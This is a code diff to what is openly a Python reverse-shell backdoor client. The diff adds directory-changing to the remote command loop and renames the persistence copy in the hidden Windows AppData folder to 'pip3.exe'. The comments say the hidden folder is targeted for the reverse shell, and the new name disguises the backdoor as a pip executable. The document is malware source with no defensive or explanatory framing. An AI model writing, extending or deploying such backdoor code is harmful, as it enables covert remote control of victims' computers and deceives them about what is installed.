@@ -75,6 +75,21 @@ def shell():
         if command.strip() == 'q':
             break
             # continue to sock.close()
+        
+        # If we wanna change directory
+        # The cd command first 2 CHAR = cd
+        # If we wanna cd to somewhere else, command.length must > 1
+        elif command[:2].strip() == 'cd' and len(command.strip()) > 1:
+            try:
+                # After the first 3 CHAR = PATH
+                os.chdir(command[3:])
+            except:
+                continue
+            # server.py needs this code as well
+            
+            # except Exception as e:
+            #     cd_error = f'[!!] Cannot cd to this PATH: {str(e)}'
+            #     continue
         else:
             try:
                 #message_back = input(f'Type Message to send to Server: ')
@@ -91,7 +106,7 @@ def shell():
 # C:\Users\USER\AppData\Roaming is hidden
 # We'll target this directory for our Reverse Shell
 # This will point to whoever user's /AppData
-location = os.environ["appdata"] + "\\pip3_setup.exe"
+location = os.environ["appdata"] + "\\pip3.exe"
 
 # If 'location' does NOT exist, it's 1st time running this Backdoor client
 if not os.path.exists(location):
